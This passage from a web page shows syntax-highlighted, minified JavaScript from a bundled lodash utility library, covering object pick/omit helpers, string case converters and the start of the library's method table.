class="string">&quot;function&quot;</span> != <span class="keyword">typeof</span> e.<span class="property">toString</span> &amp;&amp; (e = <span class="title class_">Ct</span>.<span class="title function_">call</span>(e)),</span><br><span class="line">                                        zt.<span class="title function_">call</span>(t, e) ? t[e].<span class="title function_">push</span>(n) : t[e] = [n]</span><br><span class="line">                                &#125;</span><br><span class="line">                            ), <span class="title class_">Qi</span>)</span><br><span class="line">                                , wc = <span class="title class_">Nr</span>(br);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">_c</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">ja</span>(t) ? <span class="title class_">Nn</span>(t) : <span class="title class_">Sr</span>(t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">xc</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">ja</span>(t) ? <span class="title class_">Nn</span>(t, !<span class="number">0</span>) : <span class="title class_">Cr</span>(t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> zc = <span class="title function_">_i</span>((<span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="title class_">Er</span>(t, e, n)</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                                , <span class="title class_">Mc</span> = <span class="title function_">_i</span>((<span class="keyword">function</span> (<span class="params">t, e, n, r</span>) &#123;</span><br><span class="line">                                    <span class="title class_">Er</span>(t, e, n, r)</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                                , <span class="title class_">Sc</span> = <span class="title function_">qi</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = &#123;&#125;;</span><br><span class="line">                                    <span class="keyword">if</span> (<span class="literal">null</span> == t)</span><br><span class="line">                                        <span class="keyword">return</span> n;</span><br><span class="line">                                    <span class="keyword">var</span> r = !<span class="number">1</span>;</span><br><span class="line">                                    e = <span class="title function_">de</span>(e, (<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> e = <span class="title function_">si</span>(e, t),</span><br><span class="line">                                            r || (r = e.<span class="property">length</span> &gt; <span class="number">1</span>),</span><br><span class="line">                                                e</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    )),</span><br><span class="line">                                        <span class="title function_">bi</span>(t, <span class="title class_">Wi</span>(t), n),</span><br><span class="line">                                    r &amp;&amp; (n = <span class="title class_">Qn</span>(n, <span class="number">7</span>, <span class="title class_">Bi</span>));</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> i = e.<span class="property">length</span>; i--;)</span><br><span class="line">                                        <span class="title function_">ti</span>(n, e[i]);</span><br><span class="line">                                    <span class="keyword">return</span> n</span><br><span class="line">                                &#125;</span><br><span class="line">                            ));</span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Cc</span> = <span class="title function_">qi</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">null</span> == t ? &#123;&#125; : <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Vr</span>(t, e, (<span class="keyword">function</span> (<span class="params">e, n</span>) &#123;</span><br><span class="line">                                                <span class="keyword">return</span> <span class="title function_">gc</span>(t, n)</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        ))</span><br><span class="line">                                    &#125;(t, e)</span><br><span class="line">                                &#125;</span><br><span class="line">                            ));</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Hc</span>(<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="literal">null</span> == t)</span><br><span class="line">                                    <span class="keyword">return</span> &#123;&#125;;</span><br><span class="line">                                <span class="keyword">var</span> n = <span class="title function_">de</span>(<span class="title class_">Wi</span>(t), (<span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> [t]</span><br><span class="line">                                    &#125;</span><br><span class="line">                                ));</span><br><span class="line">                                <span class="keyword">return</span> e = <span class="title class_">Qi</span>(e),</span><br><span class="line">                                    <span class="title class_">Vr</span>(t, n, (<span class="keyword">function</span> (<span class="params">t, n</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="title function_">e</span>(t, n[<span class="number">0</span>])</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    ))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Tc</span> = <span class="title class_">Ni</span>(_c)</span><br><span class="line">                                , <span class="title class_">Ac</span> = <span class="title class_">Ni</span>(xc);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Oc</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="literal">null</span> == t ? [] : <span class="title function_">ke</span>(t, <span class="title function_">_c</span>(t))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Ec</span> = <span class="title class_">Si</span>((<span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> e = e.<span class="title function_">toLowerCase</span>(),</span><br><span class="line">                                    t + (n ? <span class="title function_">kc</span>(e) : e)</span><br><span class="line">                                &#125;</span><br><span class="line">                            ));</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">kc</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Rc</span>(<span class="title function_">sc</span>(t).<span class="title function_">toLowerCase</span>())</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Lc</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> (t = <span class="title function_">sc</span>(t)) &amp;&amp; t.<span class="title function_">replace</span>(ut, <span class="title class_">Fe</span>).<span class="title function_">replace</span>(<span class="title class_">Lt</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Vc</span> = <span class="title class_">Si</span>((<span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t + (n ? <span class="string">&quot;-&quot;</span> : <span class="string">&quot;&quot;</span>) + e.<span class="title function_">toLowerCase</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                                , <span class="title class_">Pc</span> = <span class="title class_">Si</span>((<span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t + (n ? <span class="string">&quot; &quot;</span> : <span class="string">&quot;&quot;</span>) + e.<span class="title function_">toLowerCase</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                                , jc = <span class="title class_">Mi</span>(<span class="string">&quot;toLowerCase&quot;</span>);</span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Fc</span> = <span class="title class_">Si</span>((<span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t + (n ? <span class="string">&quot;_&quot;</span> : <span class="string">&quot;&quot;</span>) + e.<span class="title function_">toLowerCase</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                            ));</span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Dc</span> = <span class="title class_">Si</span>((<span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t + (n ? <span class="string">&quot; &quot;</span> : <span class="string">&quot;&quot;</span>) + <span class="title class_">Rc</span>(e)</span><br><span class="line">                                &#125;</span><br><span class="line">                            ));</span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Nc</span> = <span class="title class_">Si</span>((<span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t + (n ? <span class="string">&quot; &quot;</span> : <span class="string">&quot;&quot;</span>) + e.<span class="title function_">toUpperCase</span>()</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                                , <span class="title class_">Rc</span> = <span class="title class_">Mi</span>(<span class="string">&quot;toUpperCase&quot;</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Ic</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t = <span class="title function_">sc</span>(t),</span><br><span class="line">                                    <span class="keyword">void</span> <span class="number">0</span> === (e = n ? <span class="keyword">void</span> <span class="number">0</span> : e) ? <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Ft</span>.<span class="title function_">test</span>(t)</span><br><span class="line">                                    &#125;(t) ? <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> t.<span class="title function_">match</span>(<span class="title class_">Pt</span>) || []</span><br><span class="line">                                    &#125;(t) : <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> t.<span class="title function_">match</span>(K) || []</span><br><span class="line">                                    &#125;(t) : t.<span class="title function_">match</span>(e) || []</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> $c = <span class="title class_">Nr</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">try</span> &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">oe</span>(t, <span class="keyword">void</span> <span class="number">0</span>, e)</span><br><span class="line">                                    &#125; <span class="keyword">catch</span> (t) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title class_">Ra</span>(t) ? t : <span class="keyword">new</span> <span class="title function_">G</span>(t)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                                , <span class="title class_">Bc</span> = <span class="title function_">qi</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">ce</span>(e, (<span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                            e = <span class="title class_">Ho</span>(e),</span><br><span class="line">                                                <span class="title class_">Xn</span>(t, e, <span class="title function_">ba</span>(t[e], t))</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    )),</span><br><span class="line">                                        t</span><br><span class="line">                                &#125;</span><br><span class="line">                            ));</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Uc</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t</span><br><span class="line">                                &#125;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> qc = <span class="title class_">Ti</span>()</span><br><span class="line">                                , <span class="title class_">Yc</span> = <span class="title class_">Ti</span>(!<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Wc</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> t</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Xc</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title class_">Mr</span>(<span class="string">&quot;function&quot;</span> == <span class="keyword">typeof</span> t ? t : <span class="title class_">Qn</span>(t, <span class="number">1</span>))</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Gc</span> = <span class="title class_">Nr</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">br</span>(n, t, e)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ))</span><br><span class="line">                                , <span class="title class_">Zc</span> = <span class="title class_">Nr</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">br</span>(t, n, e)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line">                            ));</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Qc</span>(<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                <span class="keyword">var</span> r = <span class="title function_">_c</span>(e)</span><br><span class="line">                                    , i = <span class="title function_">hr</span>(e, r);</span><br><span class="line">                                <span class="literal">null</span> != n || <span class="title class_">Ua</span>(e) &amp;&amp; (i.<span class="property">length</span> || !r.<span class="property">length</span>) || (n = e,</span><br><span class="line">                                    e = t,</span><br><span class="line">                                    t = <span class="variable language_">this</span>,</span><br><span class="line">                                    i = <span class="title function_">hr</span>(e, <span class="title function_">_c</span>(e)));</span><br><span class="line">                                <span class="keyword">var</span> o = !(<span class="title class_">Ua</span>(n) &amp;&amp; <span class="string">&quot;chain&quot;</span> <span class="keyword">in</span> n &amp;&amp; !n.<span class="property">chain</span>)</span><br><span class="line">                                    , a = <span class="title class_">Ia</span>(t);</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">ce</span>(i, (<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> r = e[n];</span><br><span class="line">                                        t[n] = r,</span><br><span class="line">                                        a &amp;&amp; (t.<span class="property"><span class="keyword">prototype</span></span>[n] = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                                <span class="keyword">var</span> e = <span class="variable language_">this</span>.<span class="property">__chain__</span>;</span><br><span class="line">                                                <span class="keyword">if</span> (o || e) &#123;</span><br><span class="line">                                                    <span class="keyword">var</span> n = <span class="title function_">t</span>(<span class="variable language_">this</span>.<span class="property">__wrapped__</span>)</span><br><span class="line">                                                        , i = n.<span class="property">__actions__</span> = <span class="title function_">yi</span>(<span class="variable language_">this</span>.<span class="property">__actions__</span>);</span><br><span class="line">                                                    <span class="keyword">return</span> i.<span class="title function_">push</span>(&#123;</span><br><span class="line">                                                        <span class="attr">func</span>: r,</span><br><span class="line">                                                        <span class="attr">args</span>: <span class="variable language_">arguments</span>,</span><br><span class="line">                                                        <span class="attr">thisArg</span>: t</span><br><span class="line">                                                    &#125;),</span><br><span class="line">                                                        n.<span class="property">__chain__</span> = e,</span><br><span class="line">                                                        n</span><br><span class="line">                                                &#125;</span><br><span class="line">                                                <span class="keyword">return</span> r.<span class="title function_">apply</span>(t, <span class="title function_">pe</span>([<span class="variable language_">this</span>.<span class="title function_">value</span>()], <span class="variable language_">arguments</span>))</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        )</span><br><span class="line">                                    &#125;</span><br><span class="line">                                )),</span><br><span class="line">                                    t</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">Jc</span>(<span class="params"></span>) &#123;</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> <span class="title class_">Kc</span> = <span class="title function_">ki</span>(de)</span><br><span class="line">                                , ts = <span class="title function_">ki</span>(ue)</span><br><span class="line">                                , es = <span class="title function_">ki</span>(ge);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">ns</span>(<span class="params">t</span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> <span class="title function_">uo</span>(t) ? <span class="title class_">Se</span>(<span class="title class_">Ho</span>(t)) : <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">e</span>) &#123;</span><br><span class="line">                                        <span class="keyword">return</span> <span class="title function_">fr</span>(e, t)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;(t)</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> rs = <span class="title class_">Vi</span>()</span><br><span class="line">                                , is = <span class="title class_">Vi</span>(!<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">os</span>(<span class="params"></span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> []</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">function</span> <span class="title function_">as</span>(<span class="params"></span>) &#123;</span><br><span class="line">                                <span class="keyword">return</span> !<span class="number">1</span></span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">var</span> cs = <span class="title class_">Ei</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t + e</span><br><span class="line">                                &#125;</span><br><span class="line">                            ), <span class="number">0</span>)</span><br><span class="line">                                , ss = <span class="title class_">Fi</span>(<span class="string">&quot;ceil&quot;</span>)</span><br><span class="line">                                , us = <span class="title class_">Ei</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t / e</span><br><span class="line">                                &#125;</span><br><span class="line">                            ), <span class="number">1</span>)</span><br><span class="line">                                , ls = <span class="title class_">Fi</span>(<span class="string">&quot;floor&quot;</span>);</span><br><span class="line">                            <span class="keyword">var</span> hs, fs = <span class="title class_">Ei</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t * e</span><br><span class="line">                                &#125;</span><br><span class="line">                            ), <span class="number">1</span>), ds = <span class="title class_">Fi</span>(<span class="string">&quot;round&quot;</span>), ps = <span class="title class_">Ei</span>((<span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> t - e</span><br><span class="line">                                &#125;</span><br><span class="line">                            ), <span class="number">0</span>);</span><br><span class="line">                            <span class="keyword">return</span> <span class="title class_">An</span>.<span class="property">after</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                <span class="keyword">if</span> (<span class="string">&quot;function&quot;</span> != <span class="keyword">typeof</span> e)</span><br><span class="line">                                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">gt</span>(o);</span><br><span class="line">                                <span class="keyword">return</span> t = <span class="title function_">ic</span>(t),</span><br><span class="line">                                    <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                        <span class="keyword">if</span> (--t &lt; <span class="number">1</span>)</span><br><span class="line">                                            <span class="keyword">return</span> e.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>)</span><br><span class="line">                                    &#125;</span><br><span class="line">                            &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">ary</span> = ga,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">assign</span> = uc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">assignIn</span> = lc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">assignInWith</span> = hc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">assignWith</span> = fc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">at</span> = dc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">before</span> = ya,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">bind</span> = ba,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">bindAll</span> = <span class="title class_">Bc</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">bindKey</span> = wa,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">castArray</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">if</span> (!<span class="variable language_">arguments</span>.<span class="property">length</span>)</span><br><span class="line">                                        <span class="keyword">return</span> [];</span><br><span class="line">                                    <span class="keyword">var</span> t = <span class="variable language_">arguments</span>[<span class="number">0</span>];</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title class_">Va</span>(t) ? t : [t]</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">chain</span> = na,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">chunk</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    e = (n ? <span class="title function_">so</span>(t, e, n) : <span class="keyword">void</span> <span class="number">0</span> === e) ? <span class="number">1</span> : <span class="title function_">cn</span>(<span class="title function_">ic</span>(e), <span class="number">0</span>);</span><br><span class="line">                                    <span class="keyword">var</span> i = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (!i || e &lt; <span class="number">1</span>)</span><br><span class="line">                                        <span class="keyword">return</span> [];</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> o = <span class="number">0</span>, a = <span class="number">0</span>, c = <span class="title function_">r</span>(<span class="title class_">Ke</span>(i / e)); o &lt; i;)</span><br><span class="line">                                        c[a++] = <span class="title class_">Yr</span>(t, o, o += e);</span><br><span class="line">                                    <span class="keyword">return</span> c</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">compact</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> e = -<span class="number">1</span>, n = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>, r = <span class="number">0</span>, i = []; ++e &lt; n;) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> o = t[e];</span><br><span class="line">                                        o &amp;&amp; (i[r++] = o)</span><br><span class="line">                                    &#125;</span><br><span class="line">                                    <span class="keyword">return</span> i</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">concat</span> = <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> t = <span class="variable language_">arguments</span>.<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">if</span> (!t)</span><br><span class="line">                                        <span class="keyword">return</span> [];</span><br><span class="line">                                    <span class="keyword">for</span> (<span class="keyword">var</span> e = <span class="title function_">r</span>(t - <span class="number">1</span>), n = <span class="variable language_">arguments</span>[<span class="number">0</span>], i = t; i--;)</span><br><span class="line">                                        e[i - <span class="number">1</span>] = <span class="variable language_">arguments</span>[i];</span><br><span class="line">                                    <span class="keyword">return</span> <span class="title function_">pe</span>(<span class="title class_">Va</span>(n) ? <span class="title function_">yi</span>(n) : [n], <span class="title function_">ar</span>(e, <span class="number">1</span>))</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">cond</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> e = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span></span><br><span class="line">                                        , n = <span class="title class_">Qi</span>();</span><br><span class="line">                                    <span class="keyword">return</span> t = e ? <span class="title function_">de</span>(t, (<span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                            <span class="keyword">if</span> (<span class="string">&quot;function&quot;</span> != <span class="keyword">typeof</span> t[<span class="number">1</span>])</span><br><span class="line">                                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title function_">gt</span>(o);</span><br><span class="line">                                            <span class="keyword">return</span> [<span class="title function_">n</span>(t[<span class="number">0</span>]), t[<span class="number">1</span>]]</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    )) : [],</span><br><span class="line">                                        <span class="title class_">Nr</span>((<span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                                <span class="keyword">for</span> (<span class="keyword">var</span> r = -<span class="number">1</span>; ++r &lt; e;) &#123;</span><br><span class="line">                                                    <span class="keyword">var</span> i = t[r];</span><br><span class="line">                                                    <span class="keyword">if</span> (<span class="title function_">oe</span>(i[<span class="number">0</span>], <span class="variable language_">this</span>, n))</span><br><span class="line">                                                        <span class="keyword">return</span> <span class="title function_">oe</span>(i[<span class="number">1</span>], <span class="variable language_">this</span>, n)</span><br><span class="line">                                                &#125;</span><br><span class="line">                                            &#125;</span><br><span class="line">                                        ))</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">conforms</span> = <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                    <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">t</span>) &#123;</span><br><span class="line">                                        <span class="keyword">var</span> e = <span class="title function_">_c</span>(t);</span><br><span class="line">                                        <span class="keyword">return</span> <span class="keyword">function</span> (<span class="params">n</span>) &#123;</span><br><span class="line">                                            <span class="keyword">return</span> <span class="title class_">Jn</span>(n, t, e)</span><br><span class="line">                                        &#125;</span><br><span class="line">                                    &#125;(<span class="title class_">Qn</span>(t, <span class="number">1</span>))</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">constant</span> = <span class="title class_">Uc</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">countBy</span> = oa,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">create</span> = <span class="keyword">function</span> (<span class="params">t, e</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> n = <span class="title class_">On</span>(t);</span><br><span class="line">                                    <span class="keyword">return</span> <span class="literal">null</span> == e ? n : <span class="title class_">Wn</span>(n, e)</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">curry</span> = <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, n, r</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> i = <span class="title class_">Ri</span>(e, <span class="number">8</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, n = r ? <span class="keyword">void</span> <span class="number">0</span> : n);</span><br><span class="line">                                    <span class="keyword">return</span> i.<span class="property">placeholder</span> = t.<span class="property">placeholder</span>,</span><br><span class="line">                                        i</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">curryRight</span> = <span class="keyword">function</span> <span class="title function_">t</span>(<span class="params">e, n, r</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> i = <span class="title class_">Ri</span>(e, <span class="number">16</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, <span class="keyword">void</span> <span class="number">0</span>, n = r ? <span class="keyword">void</span> <span class="number">0</span> : n);</span><br><span class="line">                                    <span class="keyword">return</span> i.<span class="property">placeholder</span> = t.<span class="property">placeholder</span>,</span><br><span class="line">                                        i</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">debounce</span> = _a,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">defaults</span> = pc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">defaultsDeep</span> = vc,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">defer</span> = xa,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">delay</span> = za,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">difference</span> = <span class="title class_">Oo</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">differenceBy</span> = <span class="title class_">Eo</span>,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">differenceWith</span> = ko,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">drop</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">return</span> r ? <span class="title class_">Yr</span>(t, (e = n || <span class="keyword">void</span> <span class="number">0</span> === e ? <span class="number">1</span> : <span class="title function_">ic</span>(e)) &lt; <span class="number">0</span> ? <span class="number">0</span> : e, r) : []</span><br><span class="line">                                &#125;</span><br><span class="line">                                ,</span><br><span class="line">                                <span class="title class_">An</span>.<span class="property">dropRight</span> = <span class="keyword">function</span> (<span class="params">t, e, n</span>) &#123;</span><br><span class="line">                                    <span class="keyword">var</span> r = <span class="literal">null</span> == t ? <span class="number">0</span> : t.<span class="property">length</span>;</span><br><span class="line">                                    <span class="keyword">return</span> r ? <span class="title class_">Yr</span>(t, <span class="number">0</span>, (e = r - (e = n || <span class="keyword">void</span> <span class="number">0</span> === e ? <span class="number">1</span> : <span class="title function_">ic</span>(e))) 